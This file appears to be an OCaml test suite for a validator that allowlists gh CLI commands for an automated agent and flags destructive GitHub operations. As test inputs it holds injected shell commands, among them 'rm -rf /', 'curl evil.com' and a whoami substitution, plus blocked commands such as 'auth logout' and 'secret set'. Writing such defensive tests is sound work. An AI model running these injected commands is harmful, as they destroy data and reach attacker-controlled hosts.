@@ -1,0 +1,215 @@
+(** Tests that keeper_github blocks dangerous commands via allowlist.
+
+    Validates:
+    1. Allowed gh commands (pr view, issue list, etc.) pass validation
+    2. Disallowed top-level commands (auth, ssh, etc.) are blocked
+    3. Destructive operations (repo delete, gist delete) are blocked
+    4. Shell metacharacters are rejected
+    5. Destructive mutations (pr merge, pr close, etc.) are detected
+    6. Low-risk writes (pr create, pr comment, etc.) are not flagged *)
+
+let validate = Masc_mcp.Worker_dev_tools.validate_gh_command
+
+let is_ok = function Ok () -> true | Error _ -> false
+let is_error = function Error _ -> true | Ok () -> false
+
+let is_destructive = Masc_mcp.Worker_dev_tools.is_gh_destructive_operation
+
+let test_allowed_read_commands () =
+  let allowed =
+    [
+      "pr view 123";
+      "pr list";
+      "pr diff 123";
+      "pr checks 123";
+      "pr status";
+      "issue view 456";
+      "issue list";
+      "issue status";
+      "repo view owner/repo";
+      "repo list";
+      "repo clone owner/repo";
+      "run view 789";
+      "run list";
+      "run watch 789";
+      "release view v1.0";
+      "release list";
+      "search issues 'bug fix'";
+      "search prs 'feature'";
+      "label list";
+      "status";
+      "api repos/owner/repo/pulls/123/comments";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "allowed: gh %s" cmd)
+        true (is_ok (validate cmd)))
+    allowed
+
+let test_allowed_write_commands () =
+  let allowed =
+    [
+      "pr create --draft --title 'fix bug'";
+      "pr comment 123 --body 'looks good'";
+      "pr ready 123";
+      "pr review 123 --approve";
+      "pr edit 123 --title 'new title'";
+      "issue create --title 'bug' --body 'desc'";
+      "issue comment 456 --body 'noted'";
+      "issue edit 456 --add-label bug";
+      "issue reopen 456";
+      "gist create file.txt";
+      "gist edit abc123";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "allowed write: gh %s" cmd)
+        true (is_ok (validate cmd)))
+    allowed
+
+let test_blocked_top_level_commands () =
+  let blocked =
+    [
+      "auth logout";
+      "auth login";
+      "ssh-key add key.pub";
+      "gpg-key add";
+      "secret set MY_SECRET";
+      "variable set MY_VAR";
+      "codespace create";
+      "extension install foo";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "blocked: gh %s" cmd)
+        true (is_error (validate cmd)))
+    blocked
+
+let test_blocked_destructive_operations () =
+  let blocked =
+    [
+      "repo delete owner/repo --yes";
+      "gist delete abc123";
+      "Repo Delete owner/repo";
+      "GIST DELETE abc123";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "blocked destructive: gh %s" cmd)
+        true (is_error (validate cmd)))
+    blocked
+
+let test_shell_metachar_blocked () =
+  let chained =
+    [
+      "pr view 123; rm -rf /";
+      "pr list | grep foo";
+      "issue view 1 && curl evil.com";
+      "pr diff 1 > /tmp/out";
+      "api repos/x < payload";
+      "pr view `whoami`";
+      "pr list $HOME";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "metachar blocked: gh %s" cmd)
+        true (is_error (validate cmd)))
+    chained
+
+let test_empty_command () =
+  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
+  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))
+
+let test_destructive_ops_detected () =
+  let destructive =
+    [
+      "pr merge 123";
+      "pr close 123";
+      "issue close 456";
+      "issue delete 456";
+      "issue transfer 456 owner/other";
+      "release delete v1.0";
+      "repo archive owner/repo";
+      "repo rename owner/repo new-name";
+      "label delete bug";
+      "api -X DELETE repos/owner/repo/issues/1";
+      "api --method DELETE repos/owner/repo/pulls/1";
+      "PR Merge 123";
+      "Issue CLOSE 456";
+      "api -X DeLeTe repos/owner/repo";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "destructive: gh %s" cmd)
+        true (is_destructive cmd))
+    destructive
+
+let test_non_destructive_ops () =
+  let safe =
+    [
+      "pr view 123";
+      "pr list";
+      "pr create --draft --title 'fix'";
+      "pr comment 123 --body 'ok'";
+      "pr ready 123";
+      "issue view 456";
+      "issue create --title 'bug'";
+      "issue comment 456 --body 'noted'";
+      "repo view owner/repo";
+      "run view 789";
+      "api repos/owner/repo/pulls";
+      "api -X GET repos/owner/repo";
+      "search issues 'query'";
+      "status";
+    ]
+  in
+  List.iter
+    (fun cmd ->
+      Alcotest.(check bool)
+        (Printf.sprintf "non-destructive: gh %s" cmd)
+        false (is_destructive cmd))
+    safe
+
+let () =
+  Alcotest.run "Keeper github safety"
+    [
+      ( "allowlist",
+        [
+          Alcotest.test_case "read commands pass" `Quick
+            test_allowed_read_commands;
+          Alcotest.test_case "low-risk write commands pass" `Quick
+            test_allowed_write_commands;
+          Alcotest.test_case "disallowed top-level commands blocked" `Quick
+            test_blocked_top_level_commands;
+          Alcotest.test_case "destructive operations blocked" `Quick
+            test_blocked_destructive_operations;
+        ] );
+      ( "metachar",
+        [
+          Alcotest.test_case "shell metacharacters blocked" `Quick
+            test_shell_metachar_blocked;
+        ] );
+      ( "destructive_gate",
+        [
+          Alcotest.test_case "destructive mutations detected" `Quick
+            test_destructive_ops_detected;
+          Alcotest.test_case "safe ops not flagged" `Quick
+            test_non_destructive_ops;
+        ] );
+      ( "edge",
+        [
+          Alcotest.test_case "empty command blocked" `Quick test_empty_command;
+        ] );
+    ]
